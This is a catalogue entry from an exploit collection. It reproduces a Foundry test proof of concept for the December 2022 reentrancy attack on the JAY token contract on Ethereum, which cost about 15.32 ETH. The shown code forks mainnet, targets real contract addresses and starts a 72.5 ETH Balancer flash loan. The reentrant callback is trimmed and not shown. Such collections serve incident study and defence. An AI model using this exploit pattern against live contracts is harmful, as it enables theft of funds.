# [?] - JAY - Insufficient validation + Reentrancy

## Summary
Severity: Unknown
Chain: Ethereum
Component: JAY
Published: 2022-12-29
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/JAY_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~15.32 ETH

```solidity
contract ContractTest is Test {
    IJay constant JAY_TOKEN = IJay(0xf2919D1D80Aff2940274014bef534f7791906FF2);
    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    uint256 constant BORROWED_ETH = 72.5 ether;

    function setUp() public {
        vm.createSelectFork("mainnet", 16_288_199);
        // Adding labels to improve stack traces' readability
        vm.label(address(JAY_TOKEN), "JAY_TOKEN");
        vm.label(address(BALANCER_VAULT), "BALANCER_VAULT");
        vm.label(address(WETH_TOKEN), "WETH_TOKEN");
        vm.label(0xce88686553686DA562CE7Cea497CE749DA109f9F, "BALANCER_ProtocolFeesCollector");
    }

    function testExploit() public {
        // "Clean" contract's balance
        payable(address(0)).transfer(address(this).balance);
        emit log_named_decimal_uint("[Start] Attacker ETH balance before exploit", address(this).balance, 18);

        // Setup flashloan parameters
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH_TOKEN);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = BORROWED_ETH;
        // The following value for "b" was used in the original exploit, but it is actually not required here
        bytes memory b =
            "0x000000000000000000000000000000000000000000000001314fb37062980000000000000000000000000000000000000000000000000002bcd40a70853a000000000000000000000000000000000000000000000000000030927f74c9de00000000000000000000000000000000000000000000000000006f05b59d3b200000";

        // Execute the flashloan. It will return the funds in the `receiveFlashLoan()` callback
        BALANCER_VAULT.flashLoan(address(this), tokens, amounts, b);

        emit log_named_decimal_uint("[End] Attacker ETH balance after exploit", address(this).balance, 18);
    }

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/JAY_exp.sol_
